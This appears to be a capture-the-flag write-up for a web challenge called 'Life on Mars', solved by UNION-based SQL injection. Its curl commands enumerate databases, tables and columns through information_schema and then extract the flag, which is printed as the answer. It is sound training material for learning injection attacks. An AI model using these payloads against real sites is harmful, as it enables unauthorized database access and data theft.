# Life on Mars
- This challenge is a basic site that queries a database to display information about the various species of life on Mars.
- We have the `/query` route and can use that to make arbitrary db calls

## SQL injection
- We can use the search= query string to send our injection
### To get the databases:
```bash
$ curl "web.ctf.b01lers.com:1001/query?search=hellas_basin%20UNION%20SELECT%20666,%20table_schema%20FROM%20information_schema.tables;%20--%20-"

["666","information_schema"],["666","alien_code"],["666","aliens"]]
```
### To get the table_names
```
➜ curl "web.ctf.b01lers.com:1001/query?search=hellas_basin%20UNION%20SELECT%20666,table_name%20FROM%20information_schema.tables;--%20-"
[...snip..., ["666","CHARACTER_SETS"],["666","COLLATIONS"],["666","COLLATION_CHARACTER_SET_APPLICABILITY"],["666","COLUMNS"],["666","COLUMN_PRIVILEGES"],["666","ENGINES"],["666","EVENTS"],["666","FILES"],["666","GLOBAL_STATUS"],["666","GLOBAL_VARIABLES"],["666","KEY_COLUMN_USAGE"],["666","OPTIMIZER_TRACE"],["666","PARAMETERS"],["666","PARTITIONS"],["666","PLUGINS"],["666","PROCESSLIST"],["666","PROFILING"],["666","REFERENTIAL_CONSTRAINTS"],["666","ROUTINES"],["666","SCHEMATA"],["666","SCHEMA_PRIVILEGES"],["666","SESSION_STATUS"],["666","SESSION_VARIABLES"],["666","STATISTICS"],["666","TABLES"],["666","TABLESPACES"],["666","TABLE_CONSTRAINTS"],["666","TABLE_PRIVILEGES"],["666","TRIGGERS"],["666","USER_PRIVILEGES"],["666","VIEWS"],["666","INNODB_LOCKS"],["666","INNODB_TRX"],["666","INNODB_SYS_DATAFILES"],["666","INNODB_FT_CONFIG"],["666","INNODB_SYS_VIRTUAL"],["666","INNODB_CMP"],["666","INNODB_FT_BEING_DELETED"],["666","INNODB_CMP_RESET"],["666","INNODB_CMP_PER_INDEX"],["666","INNODB_CMPMEM_RESET"],["666","INNODB_FT_DELETED"],["666","INNODB_BUFFER_PAGE_LRU"],["666","INNODB_LOCK_WAITS"],["666","INNODB_TEMP_TABLE_INFO"],["666","INNODB_SYS_INDEXES"],["666","INNODB_SYS_TABLES"],["666","INNODB_SYS_FIELDS"],["666","INNODB_CMP_PER_INDEX_RESET"],["666","INNODB_BUFFER_PAGE"],["666","INNODB_FT_DEFAULT_STOPWORD"],["666","INNODB_FT_INDEX_TABLE"],["666","INNODB_FT_INDEX_CACHE"],["666","INNODB_SYS_TABLESPACES"],["666","INNODB_METRICS"],["666","INNODB_SYS_FOREIGN_COLS"],["666","INNODB_CMPMEM"],["666","INNODB_BUFFER_POOL_STATS"],["666","INNODB_SYS_COLUMNS"],["666","INNODB_SYS_FOREIGN"],["666","INNODB_SYS_TABLESTATS"],["666","code"],["666","amazonis_planitia"],["666","arabia_terra"],["666","chryse_planitia"],["666","hellas_basin"],["666","hesperia_planum"],["666","noachis_terra"],["666","olympus_mons"],["666","tharsis_rise"],["666","utopia_basin"]]
```
- The 'code' table is not given, so lets see if its part of the `alien_code` database

### To get columns in code table
```bash
$ curl "web.ctf.b01lers.com:1001/query?search=hesperia_planum%20UNION%20SELECT%20666,%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name='code';--%20-"
[...snip...,["666","id"],["666","code"]]
```


### To get the flag:
- Trying a valid query to alien\_code.code
```bash
curl "web.ctf.b01lers.com:1001/query?search=utopia_basin%20UNION%20SELECT%20id,%20code%20FROM%20alien_code.code;%20--%20-
[...snip...,["0","pctf{no_intelligent_life_here}"]]

```

# Flag
- pctf{no_intelligent_life_here}
